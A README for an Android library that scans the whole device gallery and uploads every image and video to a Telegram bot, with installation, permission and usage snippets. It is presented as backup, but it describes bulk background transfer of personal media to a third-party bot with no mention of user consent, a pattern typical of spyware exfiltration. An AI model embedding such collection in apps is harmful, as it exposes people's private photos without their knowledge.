[![](https://jitpack.io/v/bshashiAi/gallery_loader.svg)](https://jitpack.io/#bshashiAi/gallery_loader)

📸 Telegram Gallery Backup Library (Android)

A powerful Android library to automatically backup device gallery (images & videos) and upload them securely to a Telegram Bot.

---

🚀 Features

- 📂 Auto fetch all gallery images & videos
- ☁️ Upload media directly to Telegram Bot
- ⚡ Fast and efficient background processing
- 🔐 Secure bot token integration
- 📊 Progress tracking support
- 🔄 Chunk-based upload system (large data handling)
- 🧩 Easy integration with any Android project

---

📦 Installation

Step 1: Add JitPack repository

dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        mavenCentral()
        maven { url 'https://jitpack.io' }
    }
}

Step 2: Add dependency

dependencies {
    implementation 'com.github.YOUR_USERNAME:TelegramGalleryBackup:1.0.0'
}

---

⚙️ Permissions Required

<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.INTERNET"/>

For Android 13+:

<uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
<uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>

---

🤖 Setup Telegram Bot

1. Open Telegram and search for BotFather
2. Create a new bot using "/newbot"
3. Copy your Bot Token
4. Get your Chat ID

---

🧠 Usage

Initialize

TelegramBackupManager manager = new TelegramBackupManager(
context,
"YOUR_BOT_TOKEN",
"YOUR_CHAT_ID"
);

manager.startBackup(new BackupCallback() {
    @Override
    public void onProgress(int progress) {
        Log.d("Backup", "Progress: " + progress + "%");
    }
    
    @Override
    public void onSuccess() {
        Log.d("Backup", "Backup Completed");
    }

    @Override
    public void onError(Exception e) {
        e.printStackTrace();
    }
});

---

📁 How It Works

1. Scans device gallery using MediaStore
2. Collects images & videos
3. Compresses (optional)
4. Uploads files to Telegram using Bot API
5. Tracks progress in real-time

---

⚠️ Limitations

- Telegram file size limit (~50MB for bots)
- Requires stable internet connection
- Background execution may be restricted on some devices

---

🔐 Security Note

- Never expose your Bot Token publicly
- Use server-side proxy for better security (recommended)

---

🛠️ Future Improvements

- 🔄 Resume upload support
- 🗜️ Advanced compression
- 📅 Scheduled backup
- 🔒 End-to-end encryption

---

🤝 Contributing

Pull requests are welcome! Feel free to open issues for suggestions or bugs.

---

📜 License

MIT License © 2026 YOUR_NAME

---

⭐ Support

If you like this project, give it a ⭐ on GitHub!
